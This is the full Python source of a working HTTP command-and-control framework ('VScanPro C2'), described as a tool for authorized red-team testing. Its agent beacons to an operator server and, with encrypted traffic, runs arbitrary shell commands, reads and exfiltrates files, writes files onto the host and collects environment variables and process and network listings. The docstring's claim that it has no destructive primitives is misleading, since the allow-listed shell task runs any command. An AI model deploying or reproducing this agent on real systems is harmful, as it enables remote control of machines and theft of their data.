"""
c2_module.py — Enterprise Command & Control (C2) Framework
==========================================================
HTTP-based C2 for authorized red-team operations, cross-platform:
agents run identically on Windows PowerShell and Kali Linux.

Architecture:
  - C2Server : threaded HTTP server; register/beacon/task/result endpoints
  - C2Agent  : polling agent; executes approved task types, encrypts results
  - Crypto   : AES (Fernet) encryption of all task payloads & results
  - Session  : structured session state persisted to JSON

Security model (authorized testing only):
  - Shared secret → derived key required by every endpoint
  - All task/result bodies encrypted with per-session Fernet keys
  - Task allow-list (system info, process list, file read, shell with
    platform-appropriate execution) — no destructive primitives

Standalone:
  Server: python c2_module.py server --port 8080 --key SECRET
  Agent : python c2_module.py agent --server http://HOST:8080 --key SECRET
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
import random
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any, Dict, List, Optional

from platform_core import (
    IS_WINDOWS,
    PLATFORM,
    PRIVILEGE,
    colorize,
    supports_color,
    run_command,
    utc_now_iso,
    __version__ as CORE_VERSION,
)

# Terminal colors (graceful degradation: plain text on dumb pipes/NO_COLOR)
from colorama import Fore, Style
_COLOR = supports_color()


def _c(text: str, color: str) -> str:
    return colorize(text, color, enabled=_COLOR)


def _good(msg: str) -> str:
    return _c(f"[+] {msg}", Fore.GREEN)


def _bad(msg: str) -> str:
    return _c(f"[!] {msg}", Fore.RED)


def _warn(msg: str) -> str:
    return _c(f"[~] {msg}", Fore.YELLOW)


def _info(msg: str) -> str:
    return _c(f"[*] {msg}", Fore.CYAN)

try:
    from cryptography.fernet import Fernet, InvalidToken
    HAS_CRYPTO = True
except ImportError:  # pragma: no cover
    HAS_CRYPTO = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:  # pragma: no cover
    HAS_REQUESTS = False


PROTOCOL_VERSION = "1.1"
USER_AGENT = f"VScanPro-C2/{PROTOCOL_VERSION} ({PLATFORM.os_type.value})"

# A task sent to an agent but never completed within this window is
# re-queued automatically (agent crashed / network dropped mid-task).
STALE_TASK_SECONDS = 300
# Agent transport: retries with exponential backoff + jitter so a flaky
# network or a brief server restart doesn't kill the session.
MAX_RETRIES = 3
RETRY_BASE_DELAY = 1.5
MAX_BACKOFF_SECONDS = 60
# Session considered online if last beacon newer than this
ONLINE_WINDOW_SECONDS = 45
# Max size of a single download/upload chunk (base64-encoded inside JSON)
MAX_FILE_CHUNK = 96 * 1024


# ---------------------------------------------------------------------------
# Crypto layer — all bodies on the wire are Fernet-encrypted
# ---------------------------------------------------------------------------

class C2Crypto:
    """AES-CBC + HMAC (Fernet) envelope encryption with key derivation."""

    def __init__(self, shared_secret: str):
        if not HAS_CRYPTO:
            raise RuntimeError("cryptography package required for C2 encryption")
        digest = hashlib.sha256(shared_secret.encode()).digest()
        self.key = base64.urlsafe_b64encode(digest)
        self.fernet = Fernet(self.key)

    def encrypt(self, plaintext: str) -> str:
        return self.fernet.encrypt(plaintext.encode()).decode()

    def decrypt(self, token: str) -> str:
        try:
            return self.fernet.decrypt(token.encode()).decode()
        except InvalidToken:
            raise ValueError("Decryption failed — wrong shared secret?")


def derive_key(shared_secret: str) -> bytes:
    return hashlib.sha256(shared_secret.encode()).digest()


# ---------------------------------------------------------------------------
# Session / task models
# ---------------------------------------------------------------------------

@dataclass
class C2Session:
    session_id: str
    hostname: str
    platform: str
    privilege: str
    agent_version: str
    registered_at: str
    last_seen: str
    is_kali: bool = False
    is_windows: bool = False
    address: str = ""

    def to_dict(self) -> Dict[str, Any]:
        d = self.__dict__.copy()
        # Derived status: online if seen within 3x the expected check-in
        # window (server-side default 15s); agents never send this.
        try:
            delta = (datetime.now(timezone.utc)
                     - datetime.fromisoformat(self.last_seen)).total_seconds()
            d["status"] = "online" if delta < ONLINE_WINDOW_SECONDS else "offline"
        except Exception:
            d["status"] = "unknown"
        return d


@dataclass
class C2Task:
    task_id: str
    session_id: str
    task_type: str
    payload: Dict[str, Any]
    status: str = "queued"          # queued | sent | done | error
    created_at: str = field(default_factory=utc_now_iso)
    result: Optional[Dict[str, Any]] = None
    completed_at: Optional[str] = None
    sent_at: Optional[float] = None  # epoch ts when dispatched (stale detection)


# Approved task types — anything else is rejected server-side
ALLOWED_TASK_TYPES = {
    "sysinfo", "processes", "connections", "shell", "read_file",
    "list_dir", "persist_check", "ping", "download", "upload",
    "screenshot_info", "env", "whoami", "kill_session",
}


# ---------------------------------------------------------------------------
# Server
# ---------------------------------------------------------------------------

class C2Server:
    """Threaded HTTP C2 server. Keeps sessions + task queues in memory
    with optional JSON persistence so restarts don't lose history."""

    def __init__(self, host: str = "0.0.0.0", port: int = 8080,
                 shared_secret: str = "changeme",
                 state_file: Optional[Path] = None):
        if not HAS_CRYPTO:
            raise RuntimeError("Install 'cryptography' to run the C2 server")
        self.host = host
        self.port = port
        self.crypto = C2Crypto(shared_secret)
        self.secret_hint = hashlib.sha256(shared_secret.encode()).hexdigest()[:12]
        self.state_file = state_file
        self._lock = threading.Lock()
        self.sessions: Dict[str, C2Session] = {}
        self.tasks: Dict[str, C2Task] = {}
        self.log_lines: List[str] = []
        self._rate_buckets: Dict[str, List[float]] = {}  # ip -> recent request ts
        self._load_state()

    # -- state persistence ---------------------------------------------------

    def _load_state(self) -> None:
        if not (self.state_file and self.state_file.exists()):
            return
        try:
            data = json.loads(self.state_file.read_text(encoding="utf-8"))
            for s in data.get("sessions", []):
                self.sessions[s["session_id"]] = C2Session(**{
                    k: v for k, v in s.items() if k in C2Session.__dataclass_fields__})
            for t in data.get("tasks", []):
                self.tasks[t["task_id"]] = C2Task(**{
                    k: v for k, v in t.items() if k in C2Task.__dataclass_fields__})
        except Exception:
            pass  # corrupted state — start fresh

    def _save_state(self) -> None:
        if not self.state_file:
            return
        try:
            # Atomic write: temp file then replace, so a crash mid-save
            # never corrupts the state file.
            tmp = self.state_file.with_suffix(".tmp")
            tmp.write_text(json.dumps({
                "saved_at": utc_now_iso(),
                "sessions": [s.to_dict() for s in self.sessions.values()],
                "tasks": [t.__dict__.copy() for t in self.tasks.values()],
            }, indent=2), encoding="utf-8")
            tmp.replace(self.state_file)
        except Exception:
            pass

    def _log(self, msg: str, level: str = "info") -> None:
        ts = datetime.now(timezone.utc).strftime('%H:%M:%S')
        line = f"[{ts}] {msg}"
        self.log_lines.append(line)
        # Cap in-memory log so long campaigns don't grow unbounded
        if len(self.log_lines) > 1000:
            del self.log_lines[:500]
        # Color-coded console output: green=success, red=error, yellow=warn
        if msg.startswith("[+]"):
            print(_c(line, Fore.GREEN), flush=True)
        elif msg.startswith("[!]"):
            print(_c(line, Fore.RED), flush=True)
        elif msg.startswith("[*]"):
            print(_c(line, Fore.CYAN), flush=True)
        else:
            print(_c(line, Fore.YELLOW), flush=True)

    # -- rate limiting (sliding window per source IP) -------------------------

    def _allow_request(self, ip: str, max_requests: int = 60,
                       window_seconds: float = 10.0) -> bool:
        """Token-bucket-ish sliding window: max 60 requests per IP per 10s.
        Agents beacon every ~5s, so legit traffic (1 req/5s) passes easily
        while floods get dropped with HTTP 429."""
        now = time.time()
        with self._lock:
            bucket = self._rate_buckets.setdefault(ip, [])
            # Evict timestamps outside the window
            self._rate_buckets[ip] = [t for t in bucket if now - t < window_seconds]
            if len(self._rate_buckets[ip]) >= max_requests:
                return False
            self._rate_buckets[ip].append(now)
        return True

    # -- task management ------------------------------------------------------

    def queue_task(self, session_id: str, task_type: str,
                   payload: Optional[Dict[str, Any]] = None) -> Optional[C2Task]:
        if task_type not in ALLOWED_TASK_TYPES:
            self._log(f"[!] Rejected task type '{task_type}' (not in allow-list)")
            return None
        if session_id not in self.sessions:
            self._log(f"[!] Rejected task for unknown session '{session_id}'")
            return None
        task = C2Task(
            task_id=f"t-{uuid.uuid4().hex[:10]}",
            session_id=session_id,
            task_type=task_type,
            payload=payload or {},
        )
        with self._lock:
            self.tasks[task.task_id] = task
            self._save_state()
        self._log(f"[+] Queued {task_type} task {task.task_id} for {session_id}")
        return task

    def _next_task_for(self, session_id: str) -> Optional[Dict[str, Any]]:
        # Skip tasks that were sent but never returned (dead session):
        # a task sent more than STALE_TASK_SECONDS ago is re-queued.
        now = time.time()
        with self._lock:
            for task in self.tasks.values():
                if task.session_id != session_id:
                    continue
                if task.status == "sent":
                    sent_at = getattr(task, "sent_at", None)
                    if sent_at and now - sent_at > STALE_TASK_SECONDS:
                        task.status = "queued"  # re-queue stuck task
                        self._log(f"[*] Re-queued stale task {task.task_id}")
                    else:
                        continue
                if task.status == "queued":
                    task.status = "sent"
                    task.sent_at = now
                    return {
                        "task_id": task.task_id,
                        "task_type": task.task_type,
                        "payload": task.payload,
                    }
        return None

    def _complete_task(self, task_id: str, result: Dict[str, Any],
                       status: str = "done") -> None:
        with self._lock:
            task = self.tasks.get(task_id)
            if task:
                task.status = status
                task.result = result
                task.completed_at = utc_now_iso()
                self._save_state()

    # -- HTTP handler ----------------------------------------------------------

    def _make_handler(self):
        server = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *args):  # silence default noisy logging
                pass

            def _send(self, code: int, body: Optional[Dict] = None, encrypted: bool = True):
                if body is None:
                    body = {}
                if encrypted and server.crypto:
                    payload = {"enc": server.crypto.encrypt(json.dumps(body))}
                else:
                    payload = body
                raw = json.dumps(payload).encode()
                self.send_response(code)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(raw)))
                self.send_header("X-Protocol", PROTOCOL_VERSION)
                self.end_headers()
                self.wfile.write(raw)

            def _read_body(self) -> Optional[Dict]:
                length = int(self.headers.get("Content-Length", 0))
                # Cap must cover the largest allowed transfer: a 20MB file
                # base64-encoded is ~27MB of JSON, plus Fernet envelope
                # overhead. Use 40MB so allowed downloads actually fit.
                if length <= 0 or length > 40_000_000:
                    return None
                raw = self.rfile.read(length)
                try:
                    data = json.loads(raw)
                except json.JSONDecodeError:
                    return None
                if "enc" in data:
                    try:
                        return json.loads(server.crypto.decrypt(data["enc"]))
                    except (ValueError, InvalidToken):
                        return None
                return data

            def do_GET(self):
                ip = self.client_address[0]
                if not server._allow_request(ip):
                    self._send(429, {"error": "rate limited"}, encrypted=False)
                    return
                if self.path == "/health":
                    self._send(200, {"status": "ok", "protocol": PROTOCOL_VERSION,
                                     "version": CORE_VERSION}, encrypted=False)
                elif self.path == "/sessions":
                    self._send(200, {"sessions": [
                        s.to_dict() for s in server.sessions.values()]})
                elif self.path == "/tasks":
                    with server._lock:
                        tasks = [t.__dict__.copy() for t in server.tasks.values()]
                    self._send(200, {"tasks": tasks})
                else:
                    self._send(404, {"error": "not found"}, encrypted=False)

            def do_POST(self):
                ip = self.client_address[0]
                if not server._allow_request(ip):
                    self._send(429, {"error": "rate limited"}, encrypted=False)
                    return
                body = self._read_body()
                if body is None:
                    self._send(401, {"error": "bad or undecryptable body"},
                               encrypted=False)
                    return

                if self.path == "/register":
                    sess = C2Session(
                        session_id=body.get("session_id", f"s-{uuid.uuid4().hex[:10]}"),
                        hostname=body.get("hostname", "unknown"),
                        platform=body.get("platform", "unknown"),
                        privilege=body.get("privilege", "unknown"),
                        agent_version=body.get("agent_version", "?"),
                        registered_at=utc_now_iso(),
                        last_seen=utc_now_iso(),
                        is_kali=body.get("is_kali", False),
                        is_windows=body.get("is_windows", False),
                        address=self.client_address[0],
                    )
                    with server._lock:
                        server.sessions[sess.session_id] = sess
                        server._save_state()
                    server._log(f"[+] Registered {sess.session_id} "
                                f"({sess.hostname} / {sess.platform} / {sess.privilege})")
                    self._send(200, {"session_id": sess.session_id,
                                     "check_in_seconds": body.get("check_in", 5)})

                elif self.path == "/beacon":
                    sid = body.get("session_id", "")
                    # Optional operator queue request piggybacked on the beacon path
                    queue_req = body.get("queue")
                    if isinstance(queue_req, dict) and queue_req.get("session_id"):
                        qsid = queue_req.get("session_id")
                        qtype = queue_req.get("task_type", "")
                        qpayload = queue_req.get("payload") or {}
                        if qsid in server.sessions:
                            task = server.queue_task(qsid, qtype, qpayload)
                            self._send(200, {"queued": task is not None,
                                             "task_id": task.task_id if task else None})
                        else:
                            self._send(404, {"error": "unknown session"})
                        return
                    with server._lock:
                        sess = server.sessions.get(sid)
                        if sess:
                            sess.last_seen = utc_now_iso()
                    if sess is None and sid:
                        # Unknown session beacons: register on the fly so an
                        # agent that persisted its ID survives a server restart.
                        sess = C2Session(
                            session_id=sid,
                            hostname=body.get("hostname", "reconnected"),
                            platform=body.get("platform", "unknown"),
                            privilege=body.get("privilege", "unknown"),
                            agent_version=body.get("agent_version", "?"),
                            registered_at=utc_now_iso(),
                            last_seen=utc_now_iso(),
                            is_kali=body.get("is_kali", False),
                            is_windows=body.get("is_windows", False),
                            address=self.client_address[0],
                        )
                        with server._lock:
                            server.sessions[sid] = sess
                            server._save_state()
                        server._log(f"[+] Re-registered persisted session {sid} "
                                    f"after server restart")
                    task = server._next_task_for(sid)
                    self._send(200, {"task": task})

                elif self.path == "/result":
                    task_id = body.get("task_id", "")
                    result = body.get("result", {})
                    ok_flag = bool(body.get("ok", True))
                    server._complete_task(task_id, result,
                                          status="done" if ok_flag else "error")
                    server._log(f"[+] Result for {task_id} received")
                    self._send(200, {"status": "ok"})
                else:
                    self._send(404, {"error": "not found"}, encrypted=False)

        return Handler

    # -- lifecycle --------------------------------------------------------------

    def serve_forever(self) -> None:
        httpd = ThreadingHTTPServer((self.host, self.port), self._make_handler())
        self._log(_good(f"C2 server listening on {self.host}:{self.port} "
                        f"(secret sha256[:12]={self.secret_hint})"))
        self._log(_info(f"Protocol {PROTOCOL_VERSION} · "
                        f"{len(ALLOWED_TASK_TYPES)} task types allowed"))
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            self._log("Shutting down")
            httpd.server_close()


# ---------------------------------------------------------------------------
# Agent
# ---------------------------------------------------------------------------

class C2Agent:
    """Polling agent. Works on Windows PowerShell and Kali Linux.
    Executes only server-issued tasks from the approved allow-list."""

    def __init__(self, server_url: str, shared_secret: str,
                 check_in: int = 5, session_id: Optional[str] = None):
        if not (HAS_CRYPTO and HAS_REQUESTS):
            missing = [m for m, ok_ in (("cryptography", HAS_CRYPTO),
                                        ("requests", HAS_REQUESTS)) if not ok_]
            raise RuntimeError(f"Missing packages for agent: {', '.join(missing)}")
        self.server = server_url.rstrip("/")
        self.crypto = C2Crypto(shared_secret)
        self.check_in = check_in
        self.session_id = session_id or f"s-{uuid.uuid4().hex[:10]}"
        self.running = False

    # -- transport --------------------------------------------------------------

    def _post(self, path: str, body: Dict[str, Any],
              retries: int = MAX_RETRIES) -> Optional[Dict[str, Any]]:
        """Encrypted POST with retry + exponential backoff + jitter."""
        for attempt in range(1, retries + 1):
            try:
                resp = requests.post(
                    f"{self.server}{path}",
                    json={"enc": self.crypto.encrypt(json.dumps(body))},
                    headers={"User-Agent": USER_AGENT},
                    timeout=10,
                )
                if resp.status_code != 200:
                    return None
                data = resp.json()
                if "enc" in data:
                    return json.loads(self.crypto.decrypt(data["enc"]))
                return data
            except Exception:
                if attempt >= retries:
                    return None
                # Exponential backoff with jitter, capped
                delay = min(RETRY_BASE_DELAY * (2 ** (attempt - 1)),
                            MAX_BACKOFF_SECONDS)
                time.sleep(delay + random.uniform(0, 0.5))
        return None

    # -- task execution -----------------------------------------------------------

    def _execute_task(self, task: Dict[str, Any]) -> Dict[str, Any]:
        ttype = task.get("task_type", "")
        payload = task.get("payload", {})
        result: Dict[str, Any] = {"ok": False, "error": "unknown task type"}

        if ttype == "sysinfo":
            result = {"ok": True, "data": {
                "platform": PLATFORM.os_name,
                "hostname": PLATFORM.hostname,
                "arch": PLATFORM.machine,
                "privilege": PRIVILEGE.value,
                "is_kali": PLATFORM.is_kali,
                "cwd": str(Path.cwd()),
            }}

        elif ttype == "processes":
            r = run_command(
                ["tasklist", "/FO", "CSV", "/NH"] if IS_WINDOWS
                else ["ps", "-eo", "pid,user,comm"],
                timeout=15,
            )
            result = {"ok": r.ok, "data": r.stdout.splitlines()[:50],
                      "error": r.stderr if not r.ok else None}

        elif ttype == "connections":
            r = run_command(
                ["netstat", "-ano"] if IS_WINDOWS else
                (["ss", "-tulnp"] if _has_tool("ss") else ["netstat", "-tulnp"]),
                timeout=15,
            )
            result = {"ok": r.ok, "data": r.stdout.splitlines()[:50],
                      "error": r.stderr if not r.ok else None}

        elif ttype == "shell":
            cmd = str(payload.get("cmd", ""))[:2000]
            if not cmd:
                result = {"ok": False, "error": "empty command"}
            else:
                # Windows PowerShell 5.1 rejects "&&" as a statement separator.
                # Use cmd.exe on Windows (true chain semantics, same syntax as
                # Linux shells for && ), bash/sh elsewhere.
                argv = ["cmd", "/c", cmd] if IS_WINDOWS else (
                    ["/bin/bash", "-lc", "--", cmd] if Path("/bin/bash").exists()
                    else ["/bin/sh", "-c", cmd])
                r = run_command(argv, timeout=payload.get("timeout", 30))
                ok_flag = r.returncode == 0 or bool(r.stdout.strip())
                result = {"ok": ok_flag, "data": {"stdout": r.stdout[:20000],
                                                  "stderr": r.stderr[:5000],
                                                  "returncode": r.returncode}}

        elif ttype == "read_file":
            path = str(payload.get("path", ""))[:1000]
            try:
                p = Path(path)
                if not p.is_file():
                    result = {"ok": False, "error": f"not a file: {path}"}
                else:
                    content = p.read_text(errors="ignore")[:20000]
                    result = {"ok": True, "data": content}
            except Exception as exc:
                result = {"ok": False, "error": str(exc)}

        elif ttype == "list_dir":
            path = str(payload.get("path", "."))[:1000]
            try:
                p = Path(path)
                entries = [
                    {"name": e.name, "dir": e.is_dir(), "size": e.stat().st_size}
                    for e in list(p.iterdir())[:200]
                ]
                result = {"ok": True, "data": entries}
            except Exception as exc:
                result = {"ok": False, "error": str(exc)}

        elif ttype == "persist_check":
            found: List[str] = []
            if IS_WINDOWS:
                r = run_command(["schtasks", "/query", "/fo", "LIST"], timeout=20)
                if r.ok:
                    found = [l.split(":", 1)[1].strip() for l in r.stdout.splitlines()
                             if l.startswith("TaskName:")][:30]
            else:
                for p in (Path("/etc/crontab"), Path.home() / ".cron_default"):
                    if p.exists():
                        found.append(str(p))
                r = run_command(["crontab", "-l"], timeout=5)
                if r.ok:
                    found.append("crontab: user entries present")
            result = {"ok": True, "data": found}

        elif ttype == "ping":
            result = {"ok": True, "data": {"pong": utc_now_iso()}}

        elif ttype == "env":
            env = dict(os.environ)
            # Redact obvious secrets even in operator-directed exfil
            for k in list(env):
                if any(s in k.upper() for s in ("PASS", "TOKEN", "SECRET", "KEY")):
                    env[k] = (env[k][:3] + "...") if env[k] else ""
            result = {"ok": True, "data": env}

        elif ttype == "whoami":
            r = run_command(["whoami", "/priv"] if IS_WINDOWS else ["id"], timeout=10)
            result = {"ok": r.ok, "data": r.stdout[:5000], "error": r.stderr if not r.ok else None}

        elif ttype == "download":
            # File exfil: agent reads local file, returns base64 in result
            path = str(payload.get("path", ""))[:1000]
            try:
                p = Path(path)
                if not p.is_file():
                    result = {"ok": False, "error": f"not a file: {path}"}
                else:
                    size = p.stat().st_size
                    if size > 20 * 1024 * 1024:
                        result = {"ok": False, "error": f"file too large for single transfer: {size} bytes"}
                    else:
                        import base64 as b64
                        data = b64.b64encode(p.read_bytes()).decode()
                        encoded_len = len(data)
                        if encoded_len > MAX_FILE_CHUNK * 4:
                            # Never return a silently-truncated payload — the
                            # operator would save a corrupted file thinking it
                            # was complete. Fail loudly with a clear size hint.
                            result = {"ok": False, "error": (
                                f"file too large for chunked transfer: "
                                f"{size} bytes (encoded {encoded_len}, "
                                f"max {MAX_FILE_CHUNK * 4})")}
                        else:
                            result = {"ok": True, "data": {
                                "path": path, "size": size, "b64": data,
                                "encoded_len": encoded_len}}
            except Exception as exc:
                result = {"ok": False, "error": str(exc)}

        elif ttype == "upload":
            # Drop a file onto the target from operator-supplied base64
            path = str(payload.get("path", ""))[:1000]
            data = str(payload.get("b64", ""))
            try:
                import base64 as b64
                raw = b64.b64decode(data)
                p = Path(path)
                p.parent.mkdir(parents=True, exist_ok=True)
                p.write_bytes(raw)
                result = {"ok": True, "data": {"path": str(p), "size": len(raw)}}
            except Exception as exc:
                result = {"ok": False, "error": str(exc)}

        elif ttype == "screenshot_info":
            # Screen metadata only (no pixels) — resolution, display count
            try:
                if IS_WINDOWS:
                    r = run_command(
                        ["powershell", "-NoProfile", "-Command",
                         "Add-Type -AssemblyName System.Windows.Forms;"
                         "[System.Windows.Forms.Screen]::AllScreens | "
                         "ForEach-Object { $_.Bounds.Width.ToString() + 'x' + $_.Bounds.Height.ToString() }"],
                        timeout=20)
                    result = {"ok": r.ok, "data": r.stdout.split() or [],
                              "error": r.stderr if not r.ok else None}
                else:
                    r = run_command(["xrandr", "--current"], timeout=10)
                    result = {"ok": r.ok,
                              "data": [l.split()[-1] for l in r.stdout.splitlines() if " connected" in l][:5],
                              "error": r.stderr if not r.ok else None}
            except Exception as exc:
                result = {"ok": False, "error": str(exc)}

        elif ttype == "kill_session":
            # Agent-side self-termination: stop loop immediately
            self.running = False
            result = {"ok": True, "data": "agent stopping on operator request"}

        return result

    # -- main loop -----------------------------------------------------------------

    def register(self) -> bool:
        body = {
            "session_id": self.session_id,
            "hostname": PLATFORM.hostname,
            "platform": PLATFORM.os_name,
            "privilege": PRIVILEGE.value,
            "agent_version": PROTOCOL_VERSION,
            "is_kali": PLATFORM.is_kali,
            "is_windows": IS_WINDOWS,
            "check_in": self.check_in,
        }
        resp = self._post("/register", body)
        return resp is not None

    def run(self, max_loops: Optional[int] = None) -> None:
        if not self.register():
            raise ConnectionError(
                f"Cannot reach C2 server at {self.server} — check server/secret")
        print(_good(f"Agent {self.session_id} connected to {self.server} "
                    f"({PLATFORM.os_name} / {PRIVILEGE.value})"))
        self.running = True
        loops = 0
        consecutive_failures = 0
        try:
            while self.running:
                resp = self._post("/beacon", {"session_id": self.session_id})
                if resp is None:
                    consecutive_failures += 1
                    if consecutive_failures >= 5:
                        print(_bad("Lost contact with server after 5 beacons"))
                        break
                    # Backoff before retrying, don't hammer a dead server
                    time.sleep(min(self.check_in * consecutive_failures, 30))
                    loops += 1
                    if max_loops is not None and loops >= max_loops:
                        break
                    continue
                consecutive_failures = 0
                task = resp.get("task")
                if task:
                    print(_info(f"Executing task {task['task_id']} ({task['task_type']})"))
                    try:
                        result = self._execute_task(task)
                    except Exception as exc:
                        # A crashing task must never kill the agent loop
                        result = {"ok": False, "error": f"agent exception: {exc}"}
                    self._post("/result", {"task_id": task["task_id"],
                                           "result": result,
                                           "ok": bool(result.get("ok", False))})
                    if result.get("ok"):
                        print(_good(f"Task {task['task_id']} complete"))
                    else:
                        print(_bad(f"Task {task['task_id']} failed: "
                                   f"{result.get('error', 'unknown')}"))
                time.sleep(self.check_in)
                loops += 1
                if max_loops is not None and loops >= max_loops:
                    break
        except KeyboardInterrupt:
            print(_warn("Agent stopped"))
        finally:
            self.running = False


def _has_tool(tool: str) -> bool:
    import shutil
    return shutil.which(tool) is not None


# ---------------------------------------------------------------------------
# Standalone entrypoints
# ---------------------------------------------------------------------------

def _run_agent_cli(args) -> None:
    try:
        agent = C2Agent(args.server, args.key, check_in=args.check_in,
                        session_id=args.session_id)
        agent.run(max_loops=args.loops)
    except KeyboardInterrupt:
        print(_warn("Agent stopped"))
    except ConnectionError as exc:
        print(_bad(str(exc)))
        raise SystemExit(1)


def main() -> None:
    parser = argparse.ArgumentParser(description="VScanPro C2 (authorized testing)")
    sub = parser.add_subparsers(dest="mode", required=True)

    srv = sub.add_parser("server", help="Run C2 server")
    srv.add_argument("--host", default="0.0.0.0")
    srv.add_argument("--port", type=int, default=8080)
    srv.add_argument("--key", required=True, help="Shared secret (both sides must match)")
    srv.add_argument("--state", default="c2_state.json", help="State persistence file")

    agt = sub.add_parser("agent", help="Run C2 agent")
    agt.add_argument("--server", required=True, help="e.g. http://10.0.0.1:8080")
    agt.add_argument("--key", required=True, help="Shared secret (must match server)")
    agt.add_argument("--check-in", type=int, default=5)
    agt.add_argument("--session-id", default=None,
                     help="Stable session ID (reuse across runs; keeps task queue aligned)")
    agt.add_argument("--loops", type=int, default=None, help="Max beacon loops (testing)")

    client = sub.add_parser("task", help="Queue a task on the server (client mode)")
    client.add_argument("--server", required=True)
    client.add_argument("--key", required=True)
    client.add_argument("--session", required=True)
    client.add_argument("--type", required=True,
                        choices=sorted(ALLOWED_TASK_TYPES))
    client.add_argument("--cmd", default=None, help="Command for shell task")
    client.add_argument("--path", default=None, help="Path for read_file/list_dir")

    args = parser.parse_args()

    if args.mode == "server":
        C2Server(args.host, args.port, args.key, state_file=Path(args.state)).serve_forever()

    elif args.mode == "agent":
        _run_agent_cli(args)

    elif args.mode == "task":
        crypto = C2Crypto(args.key)
        try:
            resp = requests.get(f"{args.server}/sessions", timeout=5)
            sessions = resp.json()
            if "enc" in sessions:
                sessions = json.loads(crypto.decrypt(sessions["enc"]))
            known = {s["session_id"] for s in sessions.get("sessions", [])}
            if args.session not in known:
                print(_bad(f"Unknown session '{args.session}'. "
                           f"Known: {sorted(known) or '(none)'}"))
                return
        except Exception as exc:
            print(_bad(f"Cannot reach server: {exc}"))
            return
        payload: Dict[str, Any] = {}
        if args.cmd:
            payload["cmd"] = args.cmd
        if args.path:
            payload["path"] = args.path
        # Direct queueing via encrypted POST (reuses beacon channel)
        enc = {"enc": crypto.encrypt(json.dumps({
            "queue": {"session_id": args.session,
                      "task_type": args.type, "payload": payload}}))}
        resp = requests.post(f"{args.server}/beacon", json=enc, timeout=5)
        if resp.status_code == 200:
            print(_good(f"Task queued ({args.type}) for {args.session}"))
        else:
            print(_bad(f"Queue failed: HTTP {resp.status_code}"))


if __name__ == "__main__":
    main()
